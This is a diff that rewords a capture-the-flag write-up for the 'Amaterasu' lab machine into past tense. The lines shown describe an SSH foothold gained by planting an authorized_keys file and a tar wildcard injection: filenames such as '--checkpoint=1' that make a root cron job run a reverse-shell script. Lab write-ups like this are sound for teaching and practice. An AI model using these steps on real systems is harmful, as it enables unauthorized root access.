@@ -243,7 +243,7 @@ Found some API features here.
 ]
 ```
 
-Let’s try to upload some file here.
+The API provides a file upload feature.
 
 ```powershell
 ┌──(root💀kali)-[~/amaterasu2]
@@ -276,7 +276,7 @@ Let’s try to upload some file here.
 <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
 ```
 
-Upload and execute php reverse shell does not work.
+Uploaded and executed php reverse shell, but it did not work.
 
 # First Shell
 
@@ -294,7 +294,7 @@ Last login: Tue Mar 28 03:21:25 2023
 alfredo
 ```
 
-Generated ssh key and upload it as authorized_keys in some home user folder and got ssh connection.
+Generated ssh key and uploaded it as authorized_keys in some home user folder and got ssh connection.
 
 # Privilege Escalation
 
@@ -312,7 +312,7 @@ tar czf /tmp/flask.tar.gz *
 
 After running linPEAS.sh, I found cron job running every minute, execute some script as root user.
 
-This tar command with wild card at the end can be exploited.
+This tar command with wild card can be exploited.
 
 [Privilege Escalation Using Wildcard Injection | Tar Wildcard Injection |](https://systemweakness.com/privilege-escalation-using-wildcard-injection-tar-wildcard-injection-a57bc81df61c)
 
@@ -330,10 +330,10 @@ Put reverse shell script in the `restapi` directory
 [alfredo@fedora restapi]$ echo "" > "--checkpoint=1"
 ```
 
-And run the commands above. These commands are registered as `tar czf /tmp/flask.tar.gz --checkpoint-action=exec=sh rev.sh --checkpoint=1` when cronjob is executed.
+Ran the commands above. These commands are registered as `tar czf /tmp/flask.tar.gz --checkpoint-action=exec=sh rev.sh --checkpoint=1` when cronjob is executed.
 
 # Root shell
 
 ![Screenshot 2024-01-01 at 21.01.02.png](Amaterasu%208a737b17570c4996b62a570a406df97f/Screenshot_2024-01-01_at_21.01.02.png)
 
-Wait for 1 minute, and got root shell.
+Waited for 1 minute, and got root shell.
